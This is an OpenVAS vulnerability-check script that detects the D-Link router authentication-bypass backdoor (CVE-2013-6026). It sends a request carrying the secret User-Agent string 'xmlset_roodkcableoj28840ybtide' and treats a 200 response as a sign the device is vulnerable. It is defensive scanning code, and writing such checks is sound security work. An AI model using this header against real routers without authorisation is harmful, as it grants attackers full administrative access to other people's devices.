###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_multiple_devices_backdoor_10_2013.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# D-Link Multiple Devices Backdoor
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103810");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-6026");
  script_bugtraq_id(62990);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("D-Link Multiple Devices Backdoor");


  script_xref(name:"URL", value:"http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/");
  script_xref(name:"URL", value:"http://www.d-link.com/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-10-14 19:24:10 +0200 (Mon, 14 Oct 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("thttpd-alphanetworks/banner");

  script_tag(name:"impact", value:"This vulnerability allows remote attackers to gain complete
administrative access to affected devices.");
  script_tag(name:"vuldetect", value:"Try to bypass authentication by using 'xmlset_roodkcableoj28840ybtide' as HTTP User-Agent.");
  script_tag(name:"insight", value:"By setting the User-Agent header to 'xmlset_roodkcableoj28840ybtide', it is
possible to access the web interface without any authentication.");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Various D-Link DSL routers are susceptible to a remote authentication
bypass vulnerability.");
  script_tag(name:"affected", value:"Various D-Link routers are affected.");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || ("thttpd-alphanetworks" >!< banner && "Alpha_webserv" >!< banner))exit(0);

host = http_host_name(port:port);

req = 'GET / HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if(result !~ "HTTP/1.. (401|302)" || "self.location.href" >< result)exit(0);

req += 'User-Agent: xmlset_roodkcableoj28840ybtide\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if(result =~ "HTTP/1.. 200" || (result !~ "HTTP/1" && "self.location.href" >< result)) {
  security_message(port:port);
  exit(0);
}

exit(99);
